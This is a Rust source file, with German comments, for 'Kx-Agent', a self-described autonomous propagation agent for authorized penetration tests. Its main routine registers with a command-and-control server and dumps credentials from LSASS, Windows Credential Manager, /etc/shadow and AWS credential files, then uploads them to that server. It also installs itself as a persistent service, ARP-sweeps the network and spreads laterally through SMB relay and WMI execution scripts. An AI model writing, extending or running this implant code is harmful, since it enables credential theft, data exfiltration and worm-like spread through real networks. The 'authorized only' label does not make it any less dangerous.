//! Kx-Agent: Autonomer Propagations-Orchestrator für autorisierte Penetrationstests.
//!
//! Entdeckt Hosts im Netz, scannt offene Ports, versucht Exploits, extrahiert
//! Secrets vom lokalen Host, installiert Persistenz und meldet alles an den
//! C2-Server. Nur für autorisierte Netzwerke gedacht.

mod c2;
mod propagate;

use std::net::Ipv4Addr;

use clap::Parser;
use tracing::{error, info};

/// Agent-Konfiguration aus CLI/Umgebung.
#[derive(Parser, Debug)]
#[command(name = "kx-agent", about = "Kx-autonomer Agent")]
struct Args {
    /// URL des C2-Servers (https://host:port).
    #[arg(long, env = "KX_C2_URL")]
    server: String,
    /// Bearer-Token für den C2-Server.
    #[arg(long, env = "KX_C2_TOKEN")]
    token: String,
    /// Netzwerkschnittstelle für den ARP-Sweep.
    #[arg(long, default_value = "eth0")]
    iface: String,
    /// Start-IP des Scan-Bereichs.
    #[arg(long)]
    start: String,
    /// End-IP des Scan-Bereichs.
    #[arg(long)]
    end: String,
    /// Eigene IP für ARP-Anfragen.
    #[arg(long, default_value = "192.168.1.100")]
    own_ip: String,
    /// Vorkonfigurierte Host-Liste (kommagetrennt) — umgeht ARP.
    #[arg(long)]
    hosts: Option<String>,
    /// Pfad zu smbrelayx.py.
    #[arg(long, default_value = "smbrelayx.py")]
    relay_script: String,
    /// Pfad zu wmiexec.py.
    #[arg(long, default_value = "wmiexec.py")]
    wmi_script: String,
    /// Pfad zum selbstsignierten Server-Zertifikat (PEM).
    #[arg(long)]
    server_cert: String,
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "info".into()),
        )
        .init();

    let args = Args::parse();
    info!("Kx-Agent startete, C2={}", args.server);

    // Die eigene IP ist die Host-Kennung des Agenten. Sie ist stabiler als eine
    // PID und zeigt auf einen Host, den der C2-Server kennt.
    let own_ip: Ipv4Addr = args.own_ip.parse().expect("Ungültige eigene IP");
    let host_id = own_ip.to_string();

    let client = match c2::C2Client::new(&args.server, &args.token, &args.server_cert) {
        Ok(c) => c,
        Err(e) => {
            error!("C2-Client-Initialisierung fehlgeschlagen: {e}");
            std::process::exit(1);
        }
    };

    // 0. Der Agent registriert sich selbst. Sonst zeigen die lokal erbeuteten
    //    Secrets auf einen Host, den der C2-Server nicht kennt.
    let self_registration = kx_core::c2::RegisterRequest {
        host_id: host_id.clone(),
        ip: host_id.clone(),
        hostname: None,
        os: None,
        status: Some(kx_core::c2::STATUS_AGENT.to_string()),
    };
    if let Err(e) = client.register_host(&self_registration).await {
        error!("Selbst-Registrierung fehlgeschlagen: {e}");
    }

    // 1. Lokale Secrets extrahieren (je nach Plattform).
    let local_secrets = collect_local_secrets(&host_id).await;
    for s in &local_secrets {
        if let Err(e) = client.upload_secret(s).await {
            error!("Secret-Upload fehlgeschlagen: {e}");
        }
    }
    info!("{} lokale Secrets extrahiert und hochgeladen", local_secrets.len());

    // 2. Persistenz installieren.
    if let Err(e) = install_persistence().await {
        error!("Persistenz-Installation fehlgeschlagen: {e}");
    } else {
        info!("Persistenz installiert");
    }

    // 3. Netzwerk-Phase: Entdeckung → Scan → Exploit.
    let range_start: Ipv4Addr = args.start.parse().expect("Ungültige Start-IP");
    let range_end: Ipv4Addr = args.end.parse().expect("Ungültige End-IP");
    let own_mac = [0x00; 6]; // Platzhalter — in der Praxis vom System lesen.

    let discovered = if let Some(hosts) = &args.hosts {
        info!("Nutze vorgegebene Host-Liste");
        hosts
            .split(',')
            .filter_map(|h| h.trim().parse::<Ipv4Addr>().ok())
            .map(|ip| kx_scanner::DiscoveredHost {
                mac: [0; 6],
                ip: ip.into(),
            })
            .collect()
    } else {
        match kx_scanner::arp_sweep(&args.iface, &range_start, &range_end, &own_ip, &own_mac) {
            Ok(h) => h,
            Err(e) => {
                error!("ARP-Sweep fehlgeschlagen: {e}");
                std::process::exit(1);
            }
        }
    };

    let results = propagate::run_propagation(
        &discovered,
        &args.relay_script,
        &args.wmi_script,
    )
    .await;

    // 4. Neuentdeckte Hosts an den C2-Server melden.
    for h in &results.new_hosts {
        let _ = client.register_host(h).await;
    }
    // Jedes Secret trägt die Kennung des Hosts, bei dem es erbeutet wurde.
    for s in &results.new_secrets {
        let _ = client.upload_secret(s).await;
    }

    info!(
        "Agent-Lauf abgeschlossen: {} neue Hosts, {} neue Secrets",
        results.new_hosts.len(),
        results.new_secrets.len()
    );
}

/// Extrahiert Secrets vom lokalen Host (Windows oder POSIX).
///
/// Jedes Secret bekommt die Host-Kennung des Agenten mit — die Kennung des Hosts,
/// bei dem es erbeutet wurde. Das ist hier der Agent selbst.
async fn collect_local_secrets(host_id: &str) -> Vec<kx_core::c2::SecretUpload> {
    let mut out = Vec::new();
    #[cfg(target_os = "windows")]
    {
        for secret in kx_win::extract_lsass().await.unwrap_or_default() {
            out.push(kx_core::c2::SecretUpload {
                host_id: host_id.to_string(),
                cred_type: secret.secret_type,
                username: secret.target,
                password: secret.value,
                source: Some("lsass".into()),
            });
        }
        for secret in kx_win::extract_credential_manager().await.unwrap_or_default() {
            out.push(kx_core::c2::SecretUpload {
                host_id: host_id.to_string(),
                cred_type: "credential_manager".into(),
                username: secret.target,
                password: secret.value,
                source: Some("cmdkey".into()),
            });
        }
    }
    #[cfg(unix)]
    {
        for secret in kx_posix::extract_shadow_hashes().await.unwrap_or_default() {
            out.push(kx_core::c2::SecretUpload {
                host_id: host_id.to_string(),
                cred_type: "shadow".into(),
                username: secret.target,
                password: secret.value,
                source: Some("/etc/shadow".into()),
            });
        }
        for secret in kx_posix::extract_aws_credentials().await.unwrap_or_default() {
            out.push(kx_core::c2::SecretUpload {
                host_id: host_id.to_string(),
                cred_type: "aws".into(),
                username: secret.target,
                password: secret.value,
                source: Some("~/.aws/credentials".into()),
            });
        }
    }
    out
}

/// Installiert Persistenz (Windows oder POSIX).
async fn install_persistence() -> Result<(), Box<dyn std::error::Error>> {
    let exe = std::env::current_exe()?;
    #[cfg(target_os = "windows")]
    {
        kx_win::install_service("kx-agent", &exe, "Kx Agent").await?;
        kx_win::start_service("kx-agent").await?;
    }
    #[cfg(unix)]
    {
        kx_posix::install_systemd_service("kx-agent", &exe, "").await?;
    }
    Ok(())
}
